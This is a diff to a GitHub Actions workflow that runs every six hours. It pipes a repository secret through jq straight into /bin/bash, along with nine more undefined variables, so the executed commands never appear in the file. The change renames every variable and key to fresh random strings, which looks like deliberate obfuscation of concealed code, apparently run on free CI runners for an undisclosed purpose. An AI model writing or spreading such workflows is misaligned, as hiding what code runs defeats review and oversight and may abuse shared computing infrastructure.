@@ -3,8 +3,7 @@ name: androidyxinz
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 1/6 * * *'
-
+    - cron: '0 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,16 +12,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: androidyxinz
         env:
-          w4409: ${{ secrets.w4409 }}
+          kdur6: ${{ secrets.kdur6 }}
         run: |
-          echo $w4409 | jq -r .iw9 | /bin/bash
-          echo $k0 | jq -r .mk6032 | /bin/bash
-          echo $iowrh028 | jq -r .skfna2 | /bin/bash
-          echo $dgsm15027 | jq -r .rjkw0 | /bin/bash
-          echo $mva9 | jq -r .a0644 | /bin/bash
-          echo $xhv816 | jq -r .wupx1412 | /bin/bash
-          echo $bs94 | jq -r .pwaq8829 | /bin/bash
-          echo $hqck1204 | jq -r .p21388 | /bin/bash
-          echo $g11 | jq -r .oh080 | /bin/bash
-          echo $hzm314 | jq -r .i55153 | /bin/bash
+          echo $kdur6 | jq -r .qwyit9177 | /bin/bash
+          echo $zjkp81899 | jq -r .zrjg96 | /bin/bash
+          echo $vwsvs88 | jq -r .kv1 | /bin/bash
+          echo $hpbnl9290 | jq -r .ami6 | /bin/bash
+          echo $s587 | jq -r .on756 | /bin/bash
+          echo $ke959 | jq -r .jidty26744 | /bin/bash
+          echo $fpouu5836 | jq -r .yvxo508 | /bin/bash
+          echo $bsolc367 | jq -r .rqe26 | /bin/bash
+          echo $pkosj56295 | jq -r .oh62802 | /bin/bash
+          echo $wmi47033 | jq -r .tc1 | /bin/bash
 
